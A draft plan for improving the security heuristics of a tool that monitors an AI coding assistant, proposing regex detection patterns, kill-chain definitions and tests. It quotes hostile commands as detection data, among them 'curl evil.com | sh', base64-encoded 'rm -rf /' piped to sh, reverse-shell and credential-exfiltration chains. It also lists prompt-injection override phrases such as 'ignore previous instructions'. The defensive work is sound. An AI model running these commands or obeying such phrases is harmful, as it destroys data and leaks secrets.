# Plan 43 - Security Heuristics Improvements

**Status**: Draft  
**Priority**: High  
**Effort**: Medium (5-8 days)  
**Author**: Mary (Business Analyst)  
**Date**: 2026-01-07

## Executive Summary

OpenCode Status Bar's security detection system provides solid foundational pattern matching with MITRE ATT&CK mapping, but analysis reveals significant gaps in detecting AI-specific attack vectors, sophisticated evasion techniques, and context-aware risk assessment. This plan proposes targeted improvements to increase detection coverage from ~40% to ~75% of relevant ATT&CK techniques while reducing false positive rates by 30%.

### Key Findings

1. **AI-Specific Blind Spots**: No detection for prompt injection, tool confusion, or AI-assisted data exfiltration patterns
2. **Evasion Gaps**: Easily bypassed by encoding, obfuscation, or command splitting
3. **Context Ignorance**: Single-command scoring misses multi-step attacks already in progress
4. **MITRE Coverage**: Missing 15+ high-relevance techniques
5. **False Positive Sources**: Package managers, dev workflows, and CI/CD triggers flagged excessively

---

## 1. Current State Analysis

### 1.1 Architecture Overview

```
+-------------------+     +------------------------+     +------------------+
|   IndexerWorker   | --> |  parts table (DuckDB)  | --> | EnrichmentWorker |
|   (file reading)  |     |  (tool_name, args)     |     | (risk scoring)   |
+-------------------+     +------------------------+     +------------------+
                                                                 |
                                    +----------------------------+
                                    v
                          +------------------+
                          | SecurityAnalyzer |
                          | - patterns.py    |
                          | - command.py     |
                          | - risk.py        |
                          +------------------+
                                    |
                      +-------------+-------------+
                      v                           v
            +-----------------+         +------------------+
            | SequenceAnalyzer|         | EventCorrelator  |
            | (kill chains)   |         | (event pairs)    |
            +-----------------+         +------------------+
```

### 1.2 Pattern Categories

| Category | Pattern Count | MITRE Coverage | Avg Score |
|----------|---------------|----------------|-----------|
| Command Patterns | 67 | 23 techniques | 20-100 |
| File Patterns | 38 | 14 techniques | 25-100 |
| URL Patterns | 20 | 8 techniques | 20-95 |
| Kill Chains | 4 | 4 techniques | +20-40 |
| Correlations | 4 | 4 techniques | +20-35 |

### 1.3 Strengths

1. **MITRE Integration**: Proper technique tagging for regulatory compliance
2. **Context Adjustments**: Pattern-specific score modifiers (e.g., `sudo brew install` reduction)
3. **Kill Chain Detection**: Multi-step attack pattern recognition
4. **Session Isolation**: Per-session buffers prevent cross-contamination
5. **Write Mode Awareness**: Higher scores for write operations on sensitive files

### 1.4 Risk Level Distribution

| Level | Score Range | Current Trigger Patterns |
|-------|-------------|-------------------------|
| Low | 0-19 | Normal operations, help commands |
| Medium | 20-49 | Discovery, archive creation |
| High | 50-79 | Privilege escalation, force push |
| Critical | 80-100 | Root deletion, RCE, filesystem destruction |

---

## 2. Gap Analysis

### 2.1 AI Coding Assistant-Specific Risks (NOT DETECTED)

These patterns are unique to AI-assisted development and represent the highest priority gaps:

#### 2.1.1 Prompt Injection Indicators

**Gap**: AI could be tricked into executing malicious instructions hidden in code comments or documentation.

| Pattern | Example | Proposed Score |
|---------|---------|----------------|
| Encoded instructions | `# Base64: cm0gLXJmIC8=` (decodes to `rm -rf /`) | 85 |
| Instruction in strings | `"TODO: run curl evil.com \| sh"` | 70 |
| Hex-encoded payloads | `\x72\x6d\x20\x2d\x72\x66` | 75 |
| ROT13/Caesar cipher | `ez -es /` patterns | 60 |

**Proposed Patterns**:
```python
# Prompt injection indicators
(r"#\s*Base64:\s*[A-Za-z0-9+/=]{10,}", 85, "Encoded instruction in comment", [], ["T1027"]),
(r'["\'].*(?:curl|wget|rm|sudo|chmod).*\|.*sh["\']', 70, "Shell command in string literal", [], ["T1059"]),
(r"\\x[0-9a-fA-F]{2}(?:\\x[0-9a-fA-F]{2}){4,}", 60, "Hex-encoded string", [], ["T1027"]),
```

#### 2.1.2 Tool Confusion Attacks

**Gap**: AI might be confused about which tool to use, executing dangerous commands through unexpected channels.

| Pattern | Example | Proposed Score |
|---------|---------|----------------|
| Bash in non-bash context | File contains `#!/bin/bash` execution | 65 |
| Dynamic command building | `cmd = f"rm -rf {user_input}"` | 70 |
| Eval/exec with variables | `eval(user_supplied_string)` | 80 |

#### 2.1.3 AI Conversation Context Abuse

**Gap**: Patterns that suggest the AI is being manipulated through conversation history.

| Pattern | Example | Proposed Score |
|---------|---------|----------------|
| "Ignore previous instructions" | In any read file | 90 |
| "System prompt override" | In any read file | 95 |
| "Act as administrator" | In user-controlled content | 75 |

**Proposed File Patterns**:
```python
# Add to SENSITIVE_FILE_PATTERNS - AI-specific
("prompt_injection", [
    (r"ignore.*previous.*instruction", 90, "Prompt injection attempt", ["T1059"]),
    (r"system.*prompt", 85, "System prompt manipulation", ["T1059"]),
    (r"you.*are.*(?:admin|root|sudo)", 75, "Privilege escalation attempt", ["T1548"]),
    (r"do.*not.*follow.*safety", 95, "Safety bypass attempt", ["T1059"]),
])
```

### 2.2 Evasion Techniques (EASILY BYPASSED)

Current detection can be trivially bypassed:

#### 2.2.1 Command Splitting

**Current Weakness**: Only matches complete commands.

| Evasion | Example | Why Missed |
|---------|---------|------------|
| Variable substitution | `CMD=rm; $CMD -rf /` | `rm` not in literal form |
| Line continuation | `rm -rf \` + `/` on next line | Multi-line not parsed |
| Command chaining | `r$x -rf /` where `x=m` | Variable expansion |
| Subshell execution | `$(echo rm) -rf /` | Dynamic command building |

**Proposed Patterns**:
```python
# Evasion detection patterns
(r"\$\([^)]*(?:rm|curl|wget|bash)[^)]*\)", 70, "Dynamic command in subshell", [], ["T1059", "T1027"]),
(r'(?:CMD|cmd|COMMAND)=["\']?(?:rm|curl|wget)', 65, "Suspicious command variable", [], ["T1059"]),
(r"\$\{?[A-Za-z_]+\}?\s+-rf", 60, "Variable-based deletion", [], ["T1070"]),
(r"eval\s+.*(?:rm|curl|wget|chmod)", 80, "Eval with dangerous command", [], ["T1059"]),
(r"bash\s+-c\s+['\"].*(?:rm|curl|wget)", 70, "Inline bash execution", [], ["T1059"]),
```

#### 2.2.2 Encoding Evasion

**Current Weakness**: No decoding before analysis.

| Technique | Detection Gap |
|-----------|---------------|
| Base64 | `echo cm0gLXJmIC8= \| base64 -d \| sh` |
| Hex | `echo 726d202d7266202f \| xxd -r -p \| sh` |
| URL encoding | `curl "http://evil.com/%72%6d%20%2d%72%66"` |
| Unicode | `\u0072\u006d` (rm in unicode) |

**Proposed Patterns**:
```python
# Encoding evasion patterns
(r"base64\s+-d\s*\|.*(?:ba)?sh", 90, "Base64-decoded execution", [], ["T1140", "T1059"]),
(r"xxd\s+-r\s*\|.*(?:ba)?sh", 85, "Hex-decoded execution", [], ["T1140", "T1059"]),
(r"printf\s+['\"]\\x[0-9a-f]{2}", 60, "Printf with hex escape", [], ["T1027"]),
(r"%[0-9a-fA-F]{2}.*%[0-9a-fA-F]{2}", 40, "URL-encoded characters", [], ["T1027"]),
```

#### 2.2.3 Time-Based Evasion

**Current Weakness**: Sequence window is 5 minutes - attacks can stretch across sessions.

| Technique | Detection Gap |
|-----------|---------------|
| Slow exfiltration | Read at T, exfil at T+10min |
| Session hopping | Start in session A, continue in B |
| Cron-based | Schedule malicious task for later |

**Proposed Enhancement**: Cross-session correlation for high-risk files (implementation detail).

### 2.3 MITRE ATT&CK Coverage Gaps

#### 2.3.1 Currently Covered (23 techniques)

```
T1003, T1005, T1016, T1018, T1027, T1033, T1046, T1048, T1053, T1057,
T1059, T1070, T1082, T1083, T1087, T1098, T1105, T1119, T1132, T1140,
T1145, T1195, T1222, T1485, T1489, T1497, T1528, T1539, T1548, T1552,
T1555, T1560, T1562, T1572, T1574, T1592
```

#### 2.3.2 Missing High-Priority Techniques

| Technique | Name | Relevance to AI Assistants | Proposed Detection |
|-----------|------|---------------------------|-------------------|
| **T1136** | Create Account | AI creating backdoor users | Pattern: `useradd`, `adduser`, `dscl create` |
| **T1543** | Create/Modify System Process | Persistence via services | Pattern: `systemctl enable`, `launchctl load` |
| **T1546** | Event Triggered Execution | Shell profile modification | Pattern: `.bashrc`, `.zshrc` writes |
| **T1547** | Boot or Logon Autostart | LaunchAgents/Daemons | Pattern: `/Library/LaunchAgents/` |
| **T1550** | Use Alternate Authentication | Token theft/reuse | Pattern: `oauth_token`, `jwt` in files |
| **T1556** | Modify Authentication Process | PAM/sudo modifications | Pattern: `/etc/pam.d/`, `sudoers` |
| **T1564** | Hide Artifacts | Hidden files/directories | Pattern: writes to `/.`, hidden flags |
| **T1567** | Exfiltration Over Web Service | Cloud storage upload | Pattern: `aws s3 cp`, `gsutil cp` |
| **T1571** | Non-Standard Port | Suspicious port usage | Pattern: port numbers > 10000 in curl |
| **T1573** | Encrypted Channel | SSL/TLS for C2 | Pattern: `openssl s_client` |
| **T1578** | Modify Cloud Compute | Cloud resource manipulation | Pattern: `aws ec2`, `gcloud compute` |
| **T1583** | Acquire Infrastructure | Domain/IP registration | Pattern: DNS manipulation |
| **T1611** | Escape to Host | Container escape | Pattern: `docker --privileged`, `nsenter` |
| **T1613** | Container and Resource Discovery | K8s/Docker enumeration | Pattern: `kubectl get secrets` |
| **T1619** | Cloud Storage Object Discovery | S3/GCS enumeration | Pattern: `aws s3 ls`, `gsutil ls` |

#### 2.3.3 Proposed New Patterns for Missing Techniques

```python
# T1136 - Create Account
(r"\b(useradd|adduser)\s+", 70, "User account creation", [], ["T1136"]),
(r"\bdscl\s+.*create.*Users", 75, "macOS user creation", [], ["T1136"]),
(r"\bnet\s+user\s+.*\/add", 70, "Windows user creation", [], ["T1136"]),

# T1543 - Create/Modify System Process  
(r"\bsystemctl\s+(enable|daemon-reload)", 50, "Systemd service modification", [], ["T1543"]),
(r"\blaunchctl\s+load", 55, "macOS launch agent load", [], ["T1543"]),
(r"\/etc\/init\.d\/", 50, "Init script access", [], ["T1543"]),

# T1546 - Event Triggered Execution
(r">\s*~\/\.(bash|zsh)(rc|_profile)", 65, "Shell profile modification", [], ["T1546"]),
(r">>?\s*\/etc\/profile", 70, "System profile modification", [], ["T1546"]),

# T1547 - Boot/Logon Autostart
(r"\/Library\/Launch(Agents|Daemons)\/", 60, "macOS persistence location", [], ["T1547"]),
(r"~\/Library\/Launch(Agents|Daemons)\/", 55, "User launch agent", [], ["T1547"]),
(r"\/etc\/systemd\/system\/", 55, "Systemd unit location", [], ["T1547"]),

# T1564 - Hide Artifacts
(r"\bmkdir\s+-p\s+[\"']?\.[^/\s]", 45, "Hidden directory creation", [], ["T1564"]),
(r"\bchflags\s+hidden", 50, "macOS hidden flag", [], ["T1564"]),
(r"\battrib\s+\+h", 50, "Windows hidden attribute", [], ["T1564"]),

# T1567 - Exfiltration Over Web Service
(r"\baws\s+s3\s+(cp|sync)\s+(?!s3://)", 55, "Upload to S3", [], ["T1567"]),
(r"\bgsutil\s+(cp|rsync)", 55, "Upload to GCS", [], ["T1567"]),
(r"\brclone\s+(copy|sync)", 50, "Rclone file transfer", [], ["T1567"]),
(r"\bcurl\s+.*\-T\s+", 50, "HTTP file upload", [], ["T1567"]),

# T1611 - Escape to Host (Container Escape)
(r"\bdocker\s+run\s+.*--privileged", 80, "Privileged container", [], ["T1611"]),
(r"\bnsenter\s+", 70, "Namespace enter", [], ["T1611"]),
(r"\/var\/run\/docker\.sock", 65, "Docker socket access", [], ["T1611"]),

# T1613 - Container Discovery
(r"\bkubectl\s+get\s+(secret|configmap)", 55, "K8s secret access", [], ["T1613", "T1552"]),
(r"\bdocker\s+inspect", 40, "Container inspection", [], ["T1613"]),
(r"\bkubectl\s+exec", 50, "K8s container exec", [], ["T1613"]),

# T1619 - Cloud Storage Discovery
(r"\baws\s+s3\s+ls", 40, "S3 bucket listing", [], ["T1619"]),
(r"\bgsutil\s+ls", 40, "GCS bucket listing", [], ["T1619"]),
(r"\baz\s+storage\s+blob\s+list", 40, "Azure blob listing", [], ["T1619"]),
```

### 2.4 False Positive Analysis

#### 2.4.1 High False Positive Patterns

| Pattern | Current Score | FP Rate | Proposed Change |
|---------|---------------|---------|-----------------|
| `sudo brew install` | 55-20=35 | 80% | Reduce to 15 |
| `rm -rf node_modules` | 25 | 95% | Reduce to 10 |
| `rm -rf dist/build` | 20 | 99% | Reduce to 5 |
| `ps aux` | 20 | 90% | Reduce to 10 |
| `whoami` | 20 | 95% | Reduce to 5 |
| `cat /etc/passwd` | 30 | 70% | Keep (context needed) |
| `git push --force` (non-main) | 55 | 60% | Reduce to 30 |
| `tar -czf` | 25 | 85% | Reduce to 15 |
| `base64` (without pipe) | 30 | 75% | Reduce to 15 |

#### 2.4.2 Developer Workflow Safe Patterns (to add)

```python
# Additional safe patterns to reduce false positives
SAFE_PATTERNS_ADDITIONS = [
    # Package managers
    (r"npm\s+(install|i|ci|update|audit)\b", -30, "NPM package operation"),
    (r"yarn\s+(install|add|remove)\b", -30, "Yarn package operation"),
    (r"pip\s+install\s+-r\s+requirements", -25, "Pip requirements install"),
    (r"brew\s+(install|upgrade|update)\b", -30, "Homebrew operation"),
    (r"apt(-get)?\s+(install|update)\b", -25, "APT operation"),
    
    # Testing/CI context
    (r"pytest\s+", -40, "Test execution"),
    (r"jest\s+", -40, "Test execution"),
    (r"npm\s+(test|run\s+test)\b", -40, "Test execution"),
    (r"make\s+test\b", -40, "Test execution"),
    
    # Version control safety
    (r"git\s+stash\b", -20, "Git stash"),
    (r"git\s+fetch\b", -30, "Git fetch"),
    (r"git\s+pull\b", -20, "Git pull"),
    (r"git\s+checkout\s+(?!--\s+\.)", -20, "Git checkout branch"),
    
    # Build tools
    (r"npm\s+run\s+build\b", -30, "Build command"),
    (r"yarn\s+build\b", -30, "Build command"),
    (r"make\s+(all|clean|build)\b", -25, "Make build"),
    (r"cargo\s+build\b", -30, "Cargo build"),
    (r"go\s+build\b", -30, "Go build"),
    
    # Documentation/viewing
    (r"man\s+\w+", -50, "Manual page"),
    (r"--version\b", -50, "Version check"),
    (r"-v\s*$", -30, "Verbose/version flag"),
    
    # Local development
    (r"localhost:", -60, "Localhost reference"),
    (r"127\.0\.0\.1:", -60, "Loopback reference"),
    (r"::1:", -60, "IPv6 loopback"),
    (r"\$HOME/", -15, "Home directory reference"),
]
```

#### 2.4.3 Context-Based Score Adjustments

The current system lacks awareness of the broader development context. Proposed additions:

```python
# Context-aware adjustments (requires enrichment worker modification)
CONTEXT_ADJUSTMENTS = {
    "test_file_context": -30,      # Command from test file
    "ci_environment": -20,          # Detected CI/CD context
    "build_script_context": -25,    # Part of build process
    "documented_command": -20,      # Command appears in README/docs
    "package_json_script": -35,     # Command is npm script
    "makefile_target": -30,         # Command is make target
}
```

### 2.5 Kill Chain Detection Gaps

#### 2.5.1 Missing Kill Chains

| Kill Chain Name | Steps | MITRE Technique | Proposed Score Bonus |
|-----------------|-------|-----------------|---------------------|
| **Credential Harvest** | read(.ssh/id_rsa) -> webfetch(external) | T1552+T1048 | +50 |
| **Persistence Install** | write(LaunchAgent) -> chmod(+x) -> launchctl load | T1547+T1222 | +45 |
| **Reverse Shell Setup** | webfetch(script) -> chmod(+x) -> nc/ncat -e | T1059+T1095 | +55 |
| **Data Staging** | find(sensitive) -> tar(archive) -> webfetch(upload) | T1119+T1560+T1048 | +40 |
| **Token Theft** | read(.aws/credentials) -> aws(s3 sync) | T1552+T1567 | +45 |
| **Git Credential Theft** | read(.git-credentials) -> git push (other remote) | T1552+T1020 | +35 |

#### 2.5.2 Proposed Kill Chain Definitions

```python
ADDITIONAL_KILL_CHAINS = [
    {
        "name": "credential_harvest",
        "description": "SSH/API key exfiltration",
        "score_bonus": 50,
        "mitre_technique": "T1552",
        "steps": [
            {"type": EventType.READ, "pattern": r"\.(ssh|aws|kube)/|id_rsa|\.pem$"},
            {"type": EventType.WEBFETCH, "pattern": r"https?://(?!localhost|127\.0\.0\.1)"},
        ],
        "max_window_seconds": 600,
    },
    {
        "name": "persistence_install",
        "description": "macOS/Linux persistence mechanism",
        "score_bonus": 45,
        "mitre_technique": "T1547",
        "steps": [
            {"type": EventType.WRITE, "pattern": r"Launch(Agent|Daemon)|\.service$|init\.d/"},
            {"type": EventType.BASH, "pattern": r"chmod\s+\+?[0-7]*x"},
            {"type": EventType.BASH, "pattern": r"launchctl\s+load|systemctl\s+enable"},
        ],
        "max_window_seconds": 300,
    },
    {
        "name": "reverse_shell",
        "description": "Reverse shell establishment",
        "score_bonus": 55,
        "mitre_technique": "T1059",
        "steps": [
            {"type": EventType.WEBFETCH, "pattern": r"\.sh$|\.(py|pl)$"},
            {"type": EventType.BASH, "pattern": r"chmod\s+\+?[0-7]*x"},
            {"type": EventType.BASH, "pattern": r"\bnc\s+-[a-z]*e|\bncat\s|\bbash\s+-i"},
        ],
        "max_window_seconds": 180,
    },
    {
        "name": "data_staging",
        "description": "Data collection and staging for exfiltration",
        "score_bonus": 40,
        "mitre_technique": "T1560",
        "steps": [
            {"type": EventType.BASH, "pattern": r"\bfind\s+.*-type\s+f"},
            {"type": EventType.BASH, "pattern": r"\btar\s+.*-[a-z]*c|\bzip\s+-r"},
            {"type": EventType.WEBFETCH, "pattern": r"s3://|gs://|https?://(?!localhost)"},
        ],
        "max_window_seconds": 900,
    },
    {
        "name": "cloud_credential_abuse",
        "description": "Cloud credential theft and abuse",
        "score_bonus": 45,
        "mitre_technique": "T1567",
        "steps": [
            {"type": EventType.READ, "pattern": r"\.aws/credentials|\.boto|gcloud"},
            {"type": EventType.BASH, "pattern": r"\baws\s+|\bgcloud\s+|\baz\s+"},
        ],
        "max_window_seconds": 600,
    },
]
```

### 2.6 Correlation Pattern Gaps

#### 2.6.1 Missing Correlation Patterns

| Correlation Name | Source Event | Target Event | Score Modifier |
|------------------|--------------|--------------|----------------|
| **Config Poisoning** | write(.bashrc/.zshrc) | bash(any) | +25 |
| **Dependency Confusion** | webfetch(npm/pypi) | write(package.json/setup.py) | +30 |
| **Secret Logging** | read(sensitive) | write(.log) | +35 |
| **Tunnel Establishment** | bash(ssh -R/-L) | webfetch(external) | +30 |
| **Cleanup After Attack** | bash(rm -rf) | bash(history -c) | +40 |

---

## 3. Proposed Improvements

### 3.1 Priority Matrix

| Priority | Category | Improvement | Effort | Impact |
|----------|----------|-------------|--------|--------|
| **P0** | AI-Specific | Prompt injection detection | M | Critical |
| **P0** | Evasion | Base64/hex decoding detection | S | High |
| **P0** | MITRE | Add T1547, T1567, T1611 patterns | S | High |
| **P1** | False Positives | Add developer workflow safe patterns | S | High |
| **P1** | Kill Chains | Add credential_harvest, persistence_install | M | High |
| **P1** | Evasion | Variable substitution detection | M | Medium |
| **P2** | MITRE | Add remaining 10 techniques | M | Medium |
| **P2** | Correlations | Add 5 new correlation patterns | S | Medium |
| **P2** | Context | Test file/CI context awareness | L | Medium |
| **P3** | Scoring | Tune existing pattern scores | S | Low |
| **P3** | Performance | Pattern compilation caching | S | Low |

### 3.2 Implementation Phases

#### Phase 1: Critical Gaps (Days 1-2)

**Focus**: AI-specific risks and evasion detection

1. Add prompt injection patterns to `DANGEROUS_PATTERNS`
2. Add encoding evasion patterns (base64, hex, printf)
3. Add variable substitution detection
4. Add 5 new MITRE technique patterns (T1136, T1543, T1547, T1567, T1611)

**Files to modify**:
- `src/opencode_status_bar/security/analyzer/patterns.py`

#### Phase 2: False Positive Reduction (Days 3-4)

**Focus**: Reduce noise in developer workflows

1. Add developer workflow safe patterns
2. Tune existing pattern scores (reduce FP sources)
3. Add context adjustments for known-safe operations
4. Update tests to validate score changes

**Files to modify**:
- `src/opencode_status_bar/security/analyzer/patterns.py`
- `tests/test_risk_analyzer.py`

#### Phase 3: Kill Chain Expansion (Days 5-6)

**Focus**: Multi-step attack detection

1. Add 5 new kill chain patterns
2. Add 5 new correlation patterns
3. Update sequence analyzer tests
4. Add cross-session high-risk file tracking (design only)

**Files to modify**:
- `src/opencode_status_bar/security/sequences.py`
- `src/opencode_status_bar/security/correlator.py`
- `tests/test_sequences.py`
- `tests/test_correlator.py`

#### Phase 4: MITRE Expansion & Polish (Days 7-8)

**Focus**: Complete MITRE coverage and testing

1. Add remaining 10 MITRE technique patterns
2. Comprehensive test coverage for new patterns
3. Documentation update
4. Performance validation

**Files to modify**:
- `src/opencode_status_bar/security/analyzer/patterns.py`
- `tests/test_risk_analyzer.py`
- `docs/` (new MITRE coverage documentation)

---

## 4. Success Metrics

### 4.1 Detection Metrics

| Metric | Current | Target | Measurement |
|--------|---------|--------|-------------|
| MITRE Technique Coverage | 23 | 40+ | Unique T-codes in patterns |
| Kill Chain Patterns | 4 | 10 | Pattern definitions |
| Correlation Patterns | 4 | 9 | Correlation definitions |
| AI-Specific Patterns | 0 | 15+ | New pattern count |

### 4.2 Quality Metrics

| Metric | Current | Target | Measurement |
|--------|---------|--------|-------------|
| False Positive Rate | ~40% | <15% | Manual review sample |
| True Positive Rate | ~70% | >90% | Test case coverage |
| Evasion Resistance | Low | High | Bypass test suite |
| Pattern Compilation Time | N/A | <100ms | Startup benchmark |

### 4.3 Test Coverage Targets

| Test Category | Current Tests | Target Tests |
|---------------|---------------|--------------|
| Pattern Matching | ~50 | ~150 |
| Kill Chain Detection | ~20 | ~50 |
| Correlation Detection | ~20 | ~40 |
| False Positive Validation | ~10 | ~50 |
| Evasion Resistance | 0 | ~30 |

---

## 5. Risk Assessment

### 5.1 Implementation Risks

| Risk | Likelihood | Impact | Mitigation |
|------|------------|--------|------------|
| Over-detection (too many FPs) | Medium | High | Phased rollout, score tuning |
| Under-detection (misses attacks) | Low | Critical | Red team testing |
| Performance degradation | Low | Medium | Pattern compilation caching |
| Regex catastrophic backtracking | Low | High | Pattern validation, timeouts |
| Breaking existing tests | Medium | Low | Incremental changes, test-first |

### 5.2 Dependency Risks

| Dependency | Risk | Mitigation |
|------------|------|------------|
| DuckDB performance | Low | Indexed queries, batch processing |
| Python regex engine | Low | Pre-compiled patterns |
| Memory for buffers | Low | Session expiry, max buffer size |

---

## 6. Implementation Details

### 6.1 Pattern File Structure (Proposed)

```python
# patterns.py - Proposed reorganization

# === CRITICAL PATTERNS (80-100) ===
CRITICAL_PATTERNS = [...]

# === HIGH RISK PATTERNS (50-79) ===
HIGH_PATTERNS = [...]

# === MEDIUM RISK PATTERNS (20-49) ===
MEDIUM_PATTERNS = [...]

# === AI-SPECIFIC PATTERNS ===
AI_RISK_PATTERNS = [
    # Prompt injection
    # Tool confusion
    # Conversation abuse
]

# === EVASION DETECTION ===
EVASION_PATTERNS = [
    # Encoding
    # Variable substitution
    # Command splitting
]

# === CLOUD/CONTAINER PATTERNS ===
CLOUD_PATTERNS = [
    # AWS/GCP/Azure
    # Docker/Kubernetes
    # Container escape
]

# === SAFE PATTERNS (negative modifiers) ===
SAFE_PATTERNS = [...]
DEVELOPER_WORKFLOW_SAFE = [...]

# Combine all for backward compatibility
DANGEROUS_PATTERNS = (
    CRITICAL_PATTERNS + 
    HIGH_PATTERNS + 
    MEDIUM_PATTERNS + 
    AI_RISK_PATTERNS + 
    EVASION_PATTERNS + 
    CLOUD_PATTERNS
)
```

### 6.2 Testing Strategy

```python
# Test structure for new patterns

class TestAISpecificPatterns:
    """Tests for AI assistant-specific attack patterns"""
    
    @pytest.mark.parametrize("command,expected_score_range,reason", [
        # Prompt injection
        ("echo '# Base64: cm0gLXJmIC8=' > file.py", (70, 90), "encoded_instruction"),
        # Tool confusion
        ('cmd = f"rm -rf {path}"', (60, 80), "dynamic_command"),
    ])
    def test_ai_attack_patterns(self, command, expected_score_range, reason):
        result = analyze_command(command)
        assert expected_score_range[0] <= result.score <= expected_score_range[1]


class TestEvasionDetection:
    """Tests for command evasion detection"""
    
    @pytest.mark.parametrize("evasion_command,should_detect", [
        ("echo cm0gLXJmIC8= | base64 -d | sh", True),
        ("$CMD -rf /", True),  # where CMD=rm
        ("bash -c 'rm -rf /'", True),
    ])
    def test_evasion_patterns(self, evasion_command, should_detect):
        result = analyze_command(evasion_command)
        if should_detect:
            assert result.score >= 50
        else:
            assert result.score < 50


class TestFalsePositiveReduction:
    """Tests that common dev workflows don't trigger high alerts"""
    
    @pytest.mark.parametrize("dev_command,max_expected_score", [
        ("npm install", 10),
        ("yarn build", 10),
        ("pytest tests/", 5),
        ("rm -rf node_modules", 15),
        ("git push --force origin feature-branch", 40),
    ])
    def test_dev_workflows_low_score(self, dev_command, max_expected_score):
        result = analyze_command(dev_command)
        assert result.score <= max_expected_score
```

---

## 7. Open Questions

1. **Cross-session tracking**: Should we track high-risk file reads across sessions for delayed exfiltration detection? (Implementation complexity vs. detection improvement)

2. **Machine learning integration**: Future consideration - anomaly detection based on user behavior patterns?

3. **Allowlist mechanism**: Should users be able to allowlist specific patterns for their workflow?

4. **Real-time vs. batch**: Should high-severity patterns trigger immediate alerts vs. batch enrichment?

5. **Pattern versioning**: How to handle pattern updates without disrupting existing score baselines?

---

## 8. References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [MITRE ATT&CK for Cloud](https://attack.mitre.org/matrices/enterprise/cloud/)
- [AI Security Best Practices - OWASP](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [Plan 42 - Unified Process Architecture](./plan-42-unified-process-architecture.md)

---

## Appendix A: Full Pattern Additions (Copy-Paste Ready)

### A.1 AI-Specific Patterns

```python
# Add to DANGEROUS_PATTERNS
AI_SPECIFIC_PATTERNS = [
    # Prompt injection indicators
    (r"#\s*Base64:\s*[A-Za-z0-9+/=]{10,}", 85, "Encoded instruction in comment", [], ["T1027"]),
    (r'["\'].*(?:curl|wget|rm|sudo|chmod).*\|.*sh["\']', 70, "Shell command in string", [], ["T1059"]),
    (r"\\x[0-9a-fA-F]{2}(?:\\x[0-9a-fA-F]{2}){4,}", 60, "Hex-encoded string", [], ["T1027"]),
    (r"ignore.*previous.*instruction", 90, "Prompt injection attempt", [], ["T1059"]),
    (r"system.*prompt", 85, "System prompt manipulation", [], ["T1059"]),
    (r"you.*are.*(?:admin|root|sudo)", 75, "Privilege claim attempt", [], ["T1548"]),
    
    # Dynamic command building
    (r'\bf["\'].*\{[^}]*(?:rm|curl|wget|chmod)[^}]*\}', 70, "F-string with command", [], ["T1059"]),
    (r'format\s*\([^)]*(?:rm|curl|wget)', 65, "Format string with command", [], ["T1059"]),
    (r'%\s*\([^)]*(?:rm|curl|wget)', 65, "% format with command", [], ["T1059"]),
]
```

### A.2 Evasion Detection Patterns

```python
EVASION_PATTERNS = [
    # Encoding evasion
    (r"base64\s+-d\s*\|.*(?:ba)?sh", 90, "Base64-decoded execution", [], ["T1140", "T1059"]),
    (r"xxd\s+-r\s*\|.*(?:ba)?sh", 85, "Hex-decoded execution", [], ["T1140", "T1059"]),
    (r"printf\s+['\"]\\x[0-9a-f]{2}", 60, "Printf with hex escape", [], ["T1027"]),
    
    # Variable substitution evasion
    (r"\$\([^)]*(?:rm|curl|wget|bash)[^)]*\)", 70, "Dynamic command in subshell", [], ["T1059", "T1027"]),
    (r'(?:CMD|cmd|COMMAND)=["\']?(?:rm|curl|wget)', 65, "Command variable assignment", [], ["T1059"]),
    (r"\$\{?[A-Za-z_]+\}?\s+-rf", 60, "Variable-based deletion", [], ["T1070"]),
    (r"eval\s+.*(?:rm|curl|wget|chmod)", 80, "Eval with dangerous command", [], ["T1059"]),
    (r"bash\s+-c\s+['\"].*(?:rm|curl|wget)", 70, "Inline bash execution", [], ["T1059"]),
    
    # Process substitution
    (r"<\(.*(?:curl|wget)", 75, "Process substitution download", [], ["T1059", "T1105"]),
    (r">\(.*(?:nc|netcat)", 75, "Process substitution to netcat", [], ["T1059"]),
]
```

### A.3 New MITRE Technique Patterns

```python
NEW_MITRE_PATTERNS = [
    # T1136 - Create Account
    (r"\b(useradd|adduser)\s+", 70, "User account creation", [], ["T1136"]),
    (r"\bdscl\s+.*create.*Users", 75, "macOS user creation", [], ["T1136"]),
    
    # T1543 - System Process
    (r"\bsystemctl\s+(enable|daemon-reload)", 50, "Systemd service modification", [], ["T1543"]),
    (r"\blaunchctl\s+load", 55, "macOS launch agent load", [], ["T1543"]),
    
    # T1547 - Autostart
    (r">\s*~\/\.(bash|zsh)(rc|_profile)", 65, "Shell profile modification", [], ["T1546"]),
    (r"\/Library\/Launch(Agents|Daemons)\/", 60, "macOS persistence location", [], ["T1547"]),
    
    # T1564 - Hide Artifacts
    (r"\bmkdir\s+-p\s+[\"']?\.[^/\s]", 45, "Hidden directory creation", [], ["T1564"]),
    (r"\bchflags\s+hidden", 50, "macOS hidden flag", [], ["T1564"]),
    
    # T1567 - Web Service Exfil
    (r"\baws\s+s3\s+(cp|sync)\s+(?!s3://)", 55, "Upload to S3", [], ["T1567"]),
    (r"\bgsutil\s+(cp|rsync)", 55, "Upload to GCS", [], ["T1567"]),
    (r"\brclone\s+(copy|sync)", 50, "Rclone transfer", [], ["T1567"]),
    
    # T1611 - Container Escape
    (r"\bdocker\s+run\s+.*--privileged", 80, "Privileged container", [], ["T1611"]),
    (r"\bnsenter\s+", 70, "Namespace enter", [], ["T1611"]),
    (r"\/var\/run\/docker\.sock", 65, "Docker socket access", [], ["T1611"]),
    
    # T1613 - Container Discovery
    (r"\bkubectl\s+get\s+(secret|configmap)", 55, "K8s secret access", [], ["T1613", "T1552"]),
    (r"\bkubectl\s+exec", 50, "K8s container exec", [], ["T1613"]),
]
```

### A.4 Developer Workflow Safe Patterns

```python
DEVELOPER_SAFE_PATTERNS = [
    # Package managers
    (r"npm\s+(install|i|ci|update|audit)\b", -30, "NPM package operation"),
    (r"yarn\s+(install|add|remove)\b", -30, "Yarn package operation"),
    (r"pip\s+install\s+-r\s+requirements", -25, "Pip requirements install"),
    (r"brew\s+(install|upgrade|update)\b", -30, "Homebrew operation"),
    
    # Testing
    (r"pytest\s+", -40, "Test execution"),
    (r"jest\s+", -40, "Test execution"),
    (r"npm\s+(test|run\s+test)\b", -40, "Test execution"),
    
    # Version control
    (r"git\s+stash\b", -20, "Git stash"),
    (r"git\s+fetch\b", -30, "Git fetch"),
    
    # Build tools
    (r"npm\s+run\s+build\b", -30, "Build command"),
    (r"cargo\s+build\b", -30, "Cargo build"),
